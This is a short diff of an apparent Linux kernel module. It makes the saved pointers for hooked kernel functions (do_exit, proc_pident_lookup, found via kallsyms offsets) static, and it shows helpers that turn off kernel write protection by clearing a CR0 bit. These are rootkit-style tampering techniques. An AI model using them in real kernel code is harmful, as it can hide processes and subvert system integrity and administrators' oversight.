@@ -58,18 +58,18 @@ unsigned long cr0;
 
 // backup value
 typedef asmlinkage void (*original_do_exit_t)(long);
-original_do_exit_t original_do_exit;
-int original_do_exit_offset;
-unsigned long original_do_exit_pos;
+static original_do_exit_t original_do_exit;
+static int original_do_exit_offset;
+static unsigned long original_do_exit_pos;
 
 typedef asmlinkage struct dentry *(*original_proc_pident_lookup_t)(struct inode *, struct dentry *,
                                                                    const struct pid_entry *,
                                                                    unsigned int);
-original_proc_pident_lookup_t original_proc_pident_lookup;
+static original_proc_pident_lookup_t original_proc_pident_lookup;
 
-unsigned long original_proc_pident_lookup_pos; // position inside the table
-int original_proc_pident_lookup_offset;        // value in the kallsyms_offsets table
-static int *kallsyms_offsets;                  // to find
+static unsigned long original_proc_pident_lookup_pos; // position inside the table
+static int original_proc_pident_lookup_offset;        // value in the kallsyms_offsets table
+static int *kallsyms_offsets;                         // to find
 
 static inline void protect_memory(void) { write_cr0(cr0); }
 static inline void unprotect_memory(void) { write_cr0(cr0 & ~0x00010000); }
